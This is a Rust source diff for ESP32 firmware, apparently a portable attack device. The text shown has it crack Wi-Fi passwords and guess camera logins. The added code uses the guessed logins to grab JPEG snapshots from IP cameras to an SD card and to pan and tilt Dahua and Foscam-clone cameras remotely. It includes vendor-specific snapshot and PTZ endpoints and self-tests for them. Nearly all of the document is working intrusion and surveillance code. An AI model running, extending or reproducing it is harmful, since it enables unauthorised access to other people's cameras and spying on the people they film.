@@ -10,6 +10,7 @@
 //! fingerprinted one at a time with the shared [`crate::radio::http`] client.
 //!
 
+use alloc::string::String;
 use alloc::vec;
 use alloc::vec::Vec;
 
@@ -18,8 +19,10 @@ use smoltcp::socket::{dhcpv4, tcp};
 use smoltcp::time::Instant as SmolInstant;
 use smoltcp::wire::{EthernetAddress, HardwareAddress, IpCidr, Ipv4Address};
 
+use esp_hal::delay::Delay;
 use esp_hal::time::{Duration, Instant};
 use esp_radio::wifi::Interface as WifiIface;
+use embedded_sdmmc::{BlockDevice, Mode as FileMode, TimeSource, VolumeIdx, VolumeManager};
 
 use crate::radio::portal::WifiPhy;
 
@@ -89,6 +92,10 @@ pub struct CamResult {
     /// Cracked WiFi password (if the joined AP was encrypted), else empty.
     pub wifi_pass: [u8; 24],
     pub wifi_pass_len: usize,
+    /// Bytes of a JPEG snapshot pulled from the first accessible camera to SD
+    /// `/SNAP.JPG` (0 = none grabbed). `snap_ip` is which host it came from.
+    pub snap_bytes: usize,
+    pub snap_ip: [u8; 4],
 }
 impl CamResult {
     pub fn new() -> Self {
@@ -103,6 +110,8 @@ impl CamResult {
             phase: "join",
             wifi_pass: [0; 24],
             wifi_pass_len: 0,
+            snap_bytes: 0,
+            snap_ip: [0; 4],
         }
     }
     pub fn set_wifi_pass(&mut self, p: &str) {
@@ -152,7 +161,12 @@ pub const CREDS: &[(&str, &str)] = &[
 /// `#[inline(never)]`: this is a big one-shot body; keeping it out of `main`
 /// stops `main`'s `.text` from overflowing the Xtensa l32r literal range.
 #[inline(never)]
-pub fn sweep(iface_sta: WifiIface<'static>, mac: [u8; 6], mut tick: impl FnMut(&CamResult) -> bool) -> CamResult {
+pub fn sweep<D: BlockDevice, T: TimeSource>(
+    iface_sta: WifiIface<'static>,
+    mac: [u8; 6],
+    vm: &VolumeManager<D, T>,
+    mut tick: impl FnMut(&CamResult) -> bool,
+) -> CamResult {
     let mut device = WifiPhy::new(iface_sta);
     let t0 = Instant::now();
     let now = || SmolInstant::from_millis(t0.elapsed().as_millis() as i64);
@@ -352,8 +366,458 @@ pub fn sweep(iface_sta: WifiIface<'static>, mac: [u8; 6], mut tick: impl FnMut(&
         }
     }
 
+    // ---- phase 5: snapshot the first accessible camera to SD (/SNAP.JPG) ----
+    res.phase = "snapshot";
+    let mut snap_lport: u16 = 60000;
+    for hi in 0..res.hosts.len() {
+        let (is_cam, basic, digest, ip4, port, brand) = {
+            let h = &res.hosts[hi];
+            (h.is_camera, h.auth_basic, h.auth_digest, h.ip, h.port, h.brand)
+        };
+        // need working creds to fetch a frame (a wide-open cam still has cred_len 0
+        // but most 401 cams do; the cred ladder fills cred on success).
+        let mut credbuf = [0u8; 24];
+        let cl = {
+            let c = res.hosts[hi].cred_str();
+            let n = c.len().min(24);
+            credbuf[..n].copy_from_slice(&c.as_bytes()[..n]);
+            n
+        };
+        if !is_cam || cl == 0 {
+            continue;
+        }
+        let cred = core::str::from_utf8(&credbuf[..cl]).unwrap_or("");
+        let (user, pass) = cred.split_once(':').unwrap_or((cred, ""));
+        let ip = Ipv4Address::new(ip4[0], ip4[1], ip4[2], ip4[3]);
+        let got = snap_one(&mut iface, &mut device, &mut sockets, fp_h, ip, port, brand, basic, digest, user, pass, &now, &mut snap_lport, vm);
+        if got > 0 {
+            res.snap_bytes = got;
+            res.snap_ip = ip4;
+            break;
+        }
+        if !tick(&res) {
+            res.phase = "done";
+            return res;
+        }
+    }
+
     res.phase = "done";
     res
+}
+
+/// Cycle an ephemeral local TCP port in a safe range (avoid reusing a TIME_WAIT one).
+fn bump_lport(p: u16) -> u16 {
+    if p >= 63000 {
+        58000
+    } else {
+        p + 1
+    }
+}
+
+/// Build the `Authorization` header for a GET to `uri` with the cracked creds: Basic
+/// base64, or a Digest response computed against the supplied challenge. `None` when
+/// neither scheme applies (the caller then sends no auth header).
+fn build_get_auth<'a>(
+    basic: bool,
+    ch: Option<&crate::radio::digest::Challenge>,
+    user: &str,
+    pass: &str,
+    uri: &str,
+    nc: &str, // Digest nonce-count, 8 hex digits — MUST increment per same-nonce request
+    authbuf: &'a mut [u8; 512],
+) -> Option<&'a str> {
+    if basic {
+        let mut tok = [0u8; 64];
+        let n = b64_userpass(user, pass, &mut tok);
+        authbuf[..6].copy_from_slice(b"Basic ");
+        authbuf[6..6 + n].copy_from_slice(&tok[..n]);
+        Some(core::str::from_utf8(&authbuf[..6 + n]).unwrap_or(""))
+    } else if let Some(c) = ch {
+        let mut resp = [0u8; 32];
+        crate::radio::digest::response_hex(
+            user, c.realm_str(), pass, "GET", uri, c.nonce_str(), c.qop_auth, nc, "0a4f113b", &mut resp,
+        );
+        let resps = core::str::from_utf8(&resp).unwrap_or("");
+        let opaque = if c.opaque_len > 0 { Some(c.opaque_str()) } else { None };
+        let hn = crate::radio::digest::build_header(
+            user, c.realm_str(), c.nonce_str(), uri, resps, opaque, c.qop_auth, nc, "0a4f113b", authbuf,
+        );
+        Some(core::str::from_utf8(&authbuf[..hn]).unwrap_or(""))
+    } else {
+        None
+    }
+}
+
+/// 8-hex-digit Digest nonce-count string for request number `n` (1-based).
+fn nc_hex(n: u32, buf: &mut [u8; 8]) -> &str {
+    const H: &[u8; 16] = b"0123456789abcdef";
+    for i in 0..8 {
+        buf[7 - i] = H[((n >> (i * 4)) & 0xF) as usize];
+    }
+    core::str::from_utf8(buf).unwrap_or("00000001")
+}
+
+/// Snapshot one camera: fetch one Digest challenge (if needed), then try each
+/// brand-candidate path with the cracked creds until one yields a JPEG (bytes to SD).
+#[allow(clippy::too_many_arguments)]
+fn snap_one<D: BlockDevice, T: TimeSource>(
+    iface: &mut Interface,
+    device: &mut WifiPhy,
+    sockets: &mut SocketSet<'_>,
+    tcp_h: SocketHandle,
+    ip: Ipv4Address,
+    port: u16,
+    brand: &str,
+    basic: bool,
+    digest: bool,
+    user: &str,
+    pass: &str,
+    now: &dyn Fn() -> SmolInstant,
+    lport: &mut u16,
+    vm: &VolumeManager<D, T>,
+) -> usize {
+    let ch = if digest {
+        let probe = crate::radio::http::http_head(iface, device, sockets, tcp_h, ip, port, "/", None, *lport, now);
+        *lport = bump_lport(*lport);
+        let c = crate::radio::digest::parse_challenge(probe.www_auth_str());
+        if c.is_digest && c.nonce_len > 0 {
+            Some(c)
+        } else {
+            None
+        }
+    } else {
+        None
+    };
+    for (i, &path) in snapshot_candidates(brand).iter().enumerate() {
+        let mut authbuf = [0u8; 512];
+        let mut ncbuf = [0u8; 8];
+        let nc = nc_hex(i as u32 + 1, &mut ncbuf); // increment nc across the reused nonce
+        let auth = build_get_auth(basic, ch.as_ref(), user, pass, path, nc, &mut authbuf);
+        let got = snapshot_to_sd(iface, device, sockets, tcp_h, ip, port, path, auth, *lport, now, vm);
+        *lport = bump_lport(*lport);
+        if got > 0 {
+            return got;
+        }
+    }
+    0
+}
+
+/// Issue one momentary PTZ nudge in `dir`. Dahua: GET start (auth header), brief hold,
+/// GET stop; generic Foscam-clone: a single onestep GET (creds in the query). Returns
+/// true if the camera accepted the move command (2xx/3xx).
+#[allow(clippy::too_many_arguments)]
+fn ptz_move(
+    iface: &mut Interface,
+    device: &mut WifiPhy,
+    sockets: &mut SocketSet<'_>,
+    tcp_h: SocketHandle,
+    ip: Ipv4Address,
+    port: u16,
+    brand: &str,
+    basic: bool,
+    digest: bool,
+    user: &str,
+    pass: &str,
+    dir: PtzDir,
+    now: &dyn Fn() -> SmolInstant,
+    lport: &mut u16,
+) -> bool {
+    let Some((mv, stop)) = ptz_paths(brand, dir, user, pass) else {
+        return false;
+    };
+    // Send a GET with a fresh Digest challenge (so nc=00000001 is always valid) plus
+    // the URL creds the generic onestep family wants — maximally auth-compatible.
+    let send = |iface: &mut Interface, device: &mut WifiPhy, sockets: &mut SocketSet<'_>, lport: &mut u16, uri: &str| -> u16 {
+        let ch = if digest {
+            let probe = crate::radio::http::http_head(iface, device, sockets, tcp_h, ip, port, "/", None, *lport, now);
+            *lport = bump_lport(*lport);
+            let c = crate::radio::digest::parse_challenge(probe.www_auth_str());
+            if c.is_digest && c.nonce_len > 0 {
+                Some(c)
+            } else {
+                None
+            }
+        } else {
+            None
+        };
+        let mut authbuf = [0u8; 512];
+        let auth = build_get_auth(basic, ch.as_ref(), user, pass, uri, "00000001", &mut authbuf);
+        let r = crate::radio::http::http_head(iface, device, sockets, tcp_h, ip, port, uri, auth, *lport, now);
+        *lport = bump_lport(*lport);
+        if r.connected {
+            r.status
+        } else {
+            0
+        }
+    };
+    let st = send(iface, device, sockets, lport, &mv);
+    if let Some(stop) = stop {
+        Delay::new().delay_millis(250); // hold the move briefly, then stop
+        // a continuous-PTZ camera must be stopped — if the stop is rejected/dropped
+        // (stale nonce, transient error) retry once so it doesn't pan forever.
+        let s1 = send(iface, device, sockets, lport, &stop);
+        if !(200..400).contains(&s1) {
+            Delay::new().delay_millis(100);
+            let _ = send(iface, device, sockets, lport, &stop);
+        }
+    }
+    (200..400).contains(&st)
+}
+
+/// Interactive camera-control session: DHCP on the already-associated STA, then loop
+/// driving PTZ nudges + snapshot refreshes from the `input` closure (which repaints
+/// the UI + returns the next command) until it returns `Quit`.
+#[inline(never)]
+#[allow(clippy::too_many_arguments)]
+pub fn control<D: BlockDevice, T: TimeSource>(
+    iface_sta: WifiIface<'static>,
+    mac: [u8; 6],
+    ip4: [u8; 4],
+    port: u16,
+    brand: &'static str,
+    basic: bool,
+    digest: bool,
+    user: &str,
+    pass: &str,
+    vm: &VolumeManager<D, T>,
+    mut input: impl FnMut(&CamCtl) -> CamCmd,
+) {
+    let mut device = WifiPhy::new(iface_sta);
+    let t0 = Instant::now();
+    let now = || SmolInstant::from_millis(t0.elapsed().as_millis() as i64);
+    let mut cfg = Config::new(HardwareAddress::Ethernet(EthernetAddress(mac)));
+    cfg.random_seed = t0.duration_since_epoch().as_micros() | 1;
+    let mut iface = Interface::new(cfg, &mut device, now());
+    let mut storage = [SocketStorage::EMPTY; 4];
+    let mut sockets = SocketSet::new(&mut storage[..]);
+    let dhcp_h = sockets.add(dhcpv4::Socket::new());
+
+    let ip = Ipv4Address::new(ip4[0], ip4[1], ip4[2], ip4[3]);
+    let mut st = CamCtl {
+        ip: ip4,
+        port,
+        brand,
+        ptz_ok: ptz_supported(brand),
+        got_ip: false,
+        phase: "dhcp",
+        last_ptz: -1,
+        snap_bytes: 0,
+        moves: 0,
+    };
+
+    // DHCP (up to 12 s; the UI can abort with Quit)
+    loop {
+        iface.poll(now(), &mut device, &mut sockets);
+        if let Some(dhcpv4::Event::Configured(c)) = sockets.get_mut::<dhcpv4::Socket>(dhcp_h).poll() {
+            iface.update_ip_addrs(|a| {
+                a.clear();
+                let _ = a.push(IpCidr::Ipv4(c.address));
+            });
+            if let Some(r) = c.router {
+                let _ = iface.routes_mut().add_default_ipv4_route(r);
+            }
+            st.got_ip = true;
+            st.phase = "ready";
+            break;
+        }
+        if matches!(input(&st), CamCmd::Quit) {
+            return;
+        }
+        if t0.elapsed() >= Duration::from_secs(12) {
+            st.phase = "no lease";
+            let _ = input(&st);
+            return;
+        }
+        Delay::new().delay_millis(20); // pace the lease wait (don't busy-spin the CPU)
+    }
+
+    let mut rx = [0u8; 512];
+    let mut tx = [0u8; 1024];
+    let tcp_h = sockets.add(tcp::Socket::new(tcp::SocketBuffer::new(&mut rx[..]), tcp::SocketBuffer::new(&mut tx[..])));
+    let mut lport = 58000u16;
+
+    loop {
+        iface.poll(now(), &mut device, &mut sockets); // keep the link serviced
+        match input(&st) {
+            CamCmd::Quit => break,
+            CamCmd::Idle => Delay::new().delay_millis(20),
+            CamCmd::Snap => {
+                st.phase = "snap";
+                let _ = input(&st);
+                st.snap_bytes =
+                    snap_one(&mut iface, &mut device, &mut sockets, tcp_h, ip, port, brand, basic, digest, user, pass, &now, &mut lport, vm);
+                st.phase = "ready";
+            }
+            CamCmd::Move(dir) => {
+                if st.ptz_ok {
+                    st.phase = "move";
+                    let _ = input(&st);
+                    let ok = ptz_move(&mut iface, &mut device, &mut sockets, tcp_h, ip, port, brand, basic, digest, user, pass, dir, &now, &mut lport);
+                    st.last_ptz = if ok { 1 } else { 0 };
+                    st.moves = st.moves.wrapping_add(1);
+                    st.phase = "ready";
+                }
+            }
+        }
+    }
+}
+
+/// Brand-ordered candidate snapshot endpoints (best guess first, then generics).
+/// Tried in order until one returns a JPEG.
+fn snapshot_candidates(brand: &str) -> &'static [&'static str] {
+    match brand {
+        "Hikvision" => &["/ISAPI/Streaming/channels/101/picture", "/Streaming/channels/1/picture", "/onvif-http/snapshot"],
+        "Dahua" => &["/cgi-bin/snapshot.cgi", "/cgi-bin/snapshot.cgi?channel=1"],
+        "Axis" => &["/axis-cgi/jpg/image.cgi", "/jpg/image.jpg"],
+        "Reolink" => &["/cgi-bin/api.cgi?cmd=Snap&channel=0&rs=1", "/snap.jpg"],
+        "Xiongmai/uc-httpd" => &["/webcapture.jpg?command=snap&channel=0", "/snapshot.cgi"],
+        _ => &["/snapshot.jpg", "/cgi-bin/snapshot.cgi", "/snap.jpg", "/image/jpeg.cgi", "/onvif-http/snapshot"],
+    }
+}
+
+/// GET `path` (with `auth`) and stream the response body to SD `/SNAP.JPG`, but only
+/// if it is actually a JPEG (SOI `FF D8 FF`). Returns bytes written, or 0 on any
+/// failure / non-JPEG (so the caller tries the next candidate path).
+#[allow(clippy::too_many_arguments)]
+fn snapshot_to_sd<D: BlockDevice, T: TimeSource>(
+    iface: &mut Interface,
+    device: &mut WifiPhy,
+    sockets: &mut SocketSet<'_>,
+    tcp_h: SocketHandle,
+    ip: Ipv4Address,
+    port: u16,
+    path: &str,
+    auth: Option<&str>,
+    lport: u16,
+    now: &dyn Fn() -> SmolInstant,
+    vm: &VolumeManager<D, T>,
+) -> usize {
+    let res = (|| -> Option<usize> {
+        let vol = vm.open_volume(VolumeIdx(0)).ok()?;
+        let dir = vol.open_root_dir().ok()?;
+        let f = dir.open_file_in_dir("SNAP.JPG", FileMode::ReadWriteCreateOrTruncate).ok()?;
+        let mut written = 0usize;
+        let mut hdr = [0u8; 3];
+        let mut hdr_len = 0usize;
+        let mut decided = false;
+        let mut is_jpeg = false;
+        let (status, _total, complete) = crate::radio::http::http_get_stream(
+            iface, device, sockets, tcp_h, ip, port, path, auth, lport, now, |chunk| {
+                // accumulate the first 3 body bytes before judging JPEG SOI, so a tiny
+                // first TCP segment doesn't wrongly reject a real image.
+                if !decided {
+                    let take = (3 - hdr_len).min(chunk.len());
+                    hdr[hdr_len..hdr_len + take].copy_from_slice(&chunk[..take]);
+                    hdr_len += take;
+                    if hdr_len < 3 {
+                        return true; // need more before deciding (still buffered in hdr)
+                    }
+                    decided = true;
+                    is_jpeg = hdr == [0xFF, 0xD8, 0xFF];
+                    if !is_jpeg {
+                        return false; // an HTML error page, not an image — try next path
+                    }
+                    if f.write(&hdr).is_err() {
+                        return false;
+                    }
+                    written += 3;
+                    if take < chunk.len() {
+                        if f.write(&chunk[take..]).is_err() {
+                            return false;
+                        }
+                        written += chunk.len() - take;
+                    }
+                    return written < 4_000_000;
+                }
+                if f.write(chunk).is_err() {
+                    return false;
+                }
+                written += chunk.len();
+                written < 4_000_000 // sanity cap
+            },
+        );
+        let _ = f.flush();
+        // require a clean end-of-transfer so a truncated read isn't saved as success.
+        if status == 200 && is_jpeg && complete && written > 0 {
+            Some(written)
+        } else {
+            None
+        }
+    })();
+    res.unwrap_or(0)
+}
+
+// ------------------------------- PTZ control -------------------------------
+
+/// A pan/tilt direction for the interactive camera-control mode.
+#[derive(Clone, Copy)]
+pub enum PtzDir {
+    Up,
+    Down,
+    Left,
+    Right,
+}
+
+/// A command from the interactive control UI, returned by the `input` closure.
+pub enum CamCmd {
+    Idle,
+    Move(PtzDir),
+    Snap,
+    Quit,
+}
+
+/// Live state of the interactive camera-control session, passed to the UI each tick.
+pub struct CamCtl {
+    pub ip: [u8; 4],
+    pub port: u16,
+    pub brand: &'static str,
+    pub ptz_ok: bool,        // PTZ is reachable over plain GET for this brand
+    pub got_ip: bool,        // DHCP lease obtained
+    pub phase: &'static str, // "dhcp" / "ready" / "move" / "snap" / "no lease"
+    pub last_ptz: i8,        // -1 none yet, 0 last move failed, 1 last move ok
+    pub snap_bytes: usize,   // bytes of the most recent snapshot grabbed to SD
+    pub moves: u32,          // PTZ moves issued this session
+}
+
+/// Can we drive this brand's PTZ over plain HTTP GET? Only brands `ptz_paths` can
+/// actually build a working command for: Dahua (`ptz.cgi` start/stop) and the
+/// GoAhead/unknown Foscam-clone family (`decoder_control.cgi` onestep). Hikvision /
+/// Axis / Reolink / Boa / Xiongmai / ONVIF need PUT+XML / SOAP / a session token we
+/// don't speak — reported as "n/a" rather than claiming a move that would 401/404.
+pub fn ptz_supported(brand: &str) -> bool {
+    matches!(brand, "Dahua" | "GoAhead cam" | "")
+}
+
+/// Build the `(move, optional-stop)` GET paths for a momentary PTZ nudge. Dahua uses
+/// `ptz.cgi` start/stop (auth via the Authorization header the caller supplies); the
+/// generic Foscam-clone family uses `decoder_control.cgi` single-step (creds in the
+/// query, no header). Returns `None` for brands we can't drive over GET.
+fn ptz_paths(brand: &str, dir: PtzDir, user: &str, pass: &str) -> Option<(String, Option<String>)> {
+    match brand {
+        "Dahua" => {
+            let code = match dir {
+                PtzDir::Up => "Up",
+                PtzDir::Down => "Down",
+                PtzDir::Left => "Left",
+                PtzDir::Right => "Right",
+            };
+            let start = alloc::format!("/cgi-bin/ptz.cgi?action=start&channel=1&code={code}&arg1=0&arg2=2&arg3=0");
+            let stop = alloc::format!("/cgi-bin/ptz.cgi?action=stop&channel=1&code={code}&arg1=0&arg2=2&arg3=0");
+            Some((start, Some(stop)))
+        }
+        b if ptz_supported(b) => {
+            // Foscam-clone / generic MJPEG cam: decoder_control.cgi single-step nudge.
+            // command 0=up 2=down 4=left 6=right; onestep=1 = momentary (no stop frame).
+            let cmd = match dir {
+                PtzDir::Up => 0,
+                PtzDir::Down => 2,
+                PtzDir::Left => 4,
+                PtzDir::Right => 6,
+            };
+            Some((alloc::format!("/decoder_control.cgi?command={cmd}&onestep=1&user={user}&pwd={pass}"), None))
+        }
+        _ => None,
+    }
 }
 
 /// Record a working `user:pass` into a host's cred buffer (truncating to fit).
@@ -619,8 +1083,80 @@ fn b64_userpass(user: &str, pass: &str, out: &mut [u8]) -> usize {
 pub fn networktest() {
     classify_selftest();
     b64_selftest();
+    snapshot_path_selftest();
+    ptz_selftest();
     crate::radio::digest::selftest();
     probe_loopback_test();
+}
+
+/// Verify the PTZ command builder: brand capability gate + Dahua start/stop pair +
+/// the generic Foscam-clone onestep URL, and that unsupported brands yield None.
+#[cfg(feature = "networktest")]
+fn ptz_selftest() {
+    use esp_println::println;
+    println!("[*] PTZ command builder (no network)...");
+    let mut pass = 0u32;
+    let mut fail = 0u32;
+    let mut chk = |name: &str, cond: bool| {
+        if cond {
+            pass += 1;
+        } else {
+            fail += 1;
+            println!("    FAIL {name}");
+        }
+    };
+    chk("dahua supported", ptz_supported("Dahua"));
+    chk("goahead supported", ptz_supported("GoAhead cam"));
+    chk("hikvision unsupported", !ptz_supported("Hikvision"));
+    chk("axis unsupported", !ptz_supported("Axis"));
+    chk("boa unsupported", !ptz_supported("Boa embedded"));
+    // Dahua: start+stop pair carrying the direction code
+    match ptz_paths("Dahua", PtzDir::Up, "admin", "pw") {
+        Some((mv, Some(stop))) => {
+            chk("dahua start", mv.contains("action=start") && mv.contains("code=Up"));
+            chk("dahua stop", stop.contains("action=stop") && stop.contains("code=Up"));
+        }
+        _ => chk("dahua paths", false),
+    }
+    chk("dahua left code", ptz_paths("Dahua", PtzDir::Left, "a", "b").map(|(m, _)| m.contains("code=Left")).unwrap_or(false));
+    // generic Foscam-clone: single onestep GET, creds in the query, no stop
+    match ptz_paths("", PtzDir::Down, "u", "p") {
+        Some((mv, None)) => chk("generic onestep", mv.contains("decoder_control.cgi") && mv.contains("command=2") && mv.contains("onestep=1") && mv.contains("user=u") && mv.contains("pwd=p")),
+        _ => chk("generic paths", false),
+    }
+    // unsupported brand -> no command
+    chk("hikvision no paths", ptz_paths("Hikvision", PtzDir::Up, "a", "b").is_none());
+    println!("    PTZ builder: {pass} pass, {fail} fail");
+}
+
+/// Verify every classifier brand maps to a non-empty, sane snapshot-candidate list,
+/// each path absolute (`/...`), and the generic fallback covers unknown brands.
+#[cfg(feature = "networktest")]
+fn snapshot_path_selftest() {
+    use esp_println::println;
+    println!("[*] snapshot path map (no network)...");
+    let brands = ["Hikvision", "Dahua", "Axis", "Reolink", "Xiongmai/uc-httpd", "GoAhead cam", "camera (realm)", ""];
+    let mut pass = 0u32;
+    let mut fail = 0u32;
+    for b in brands {
+        let c = snapshot_candidates(b);
+        let ok = !c.is_empty() && c.iter().all(|p| p.starts_with('/') && p.len() > 1);
+        if ok {
+            pass += 1;
+        } else {
+            fail += 1;
+            println!("    FAIL brand {b:?}: {c:?}");
+        }
+    }
+    // an unknown brand must hit the generic fallback (Hikvision-specific path absent)
+    let generic = snapshot_candidates("totally unknown");
+    if generic.contains(&"/snapshot.jpg") {
+        pass += 1;
+    } else {
+        fail += 1;
+        println!("    FAIL generic fallback missing /snapshot.jpg");
+    }
+    println!("    snapshot paths: {pass} pass, {fail} fail");
 }
 
 #[cfg(feature = "networktest")]
